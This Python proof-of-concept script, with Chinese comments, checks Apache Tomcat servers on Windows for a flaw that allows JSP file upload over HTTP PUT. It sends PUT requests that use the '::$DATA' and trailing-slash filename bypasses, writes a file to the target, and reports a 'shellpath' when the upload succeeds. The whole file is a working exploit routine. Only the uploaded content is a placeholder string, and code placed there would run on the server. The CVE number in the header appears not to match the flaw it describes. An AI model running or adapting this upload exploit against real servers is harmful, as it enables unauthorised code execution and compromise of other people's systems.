#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Tomcat代码执行漏洞(CVE-2017-12616)
referer: https://mp.weixin.qq.com/s/dgWT3Cgf1mQs-IYxeID_Mw
author: Lucifer
description: 当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。
影响版本:Apache Tomcat 7.0.0 - 7.0.79（7.0.81修复不完全）。
'''
import sys
import time
import hashlib
import requests
import datetime
import warnings
def run(url):
        result = ['Tomcat代码执行漏洞(CVE-2017-12616)', '', '']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        post_data = "thisisashell"
        time_stamp = time.mktime(datetime.datetime.now().timetuple())
        m = hashlib.md5(str(time_stamp).encode(encoding='utf-8'))
        md5_str = m.hexdigest()
        vulnurl = url + "/" + md5_str +".jsp::$DATA"
        try:
            req = requests.put(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if req.status_code == 201:
                result[2] = '存在'
                result[1 ]=vulnurl+"\tshellpath: "+url+"/"+md5_str+".jsp"
                return result
            else:
                result[2] = '不存在'

        except:
            result[2] = '不存在'
            return result

        time_stamp = time.mktime(datetime.datetime.now().timetuple())
        m = hashlib.md5(str(time_stamp).encode(encoding='utf-8'))
        md5_str = m.hexdigest()
        vulnurl = url + "/" + md5_str +".jsp/"
        try:
            req = requests.put(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if req.status_code == 201:
                result[2] = '存在'
                result[1]=vulnurl+"\tshellpath: "+url+"/"+md5_str+".jsp"
                return result
            else:
                result[2] = '不存在'

        except:
            result[2] = '不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    
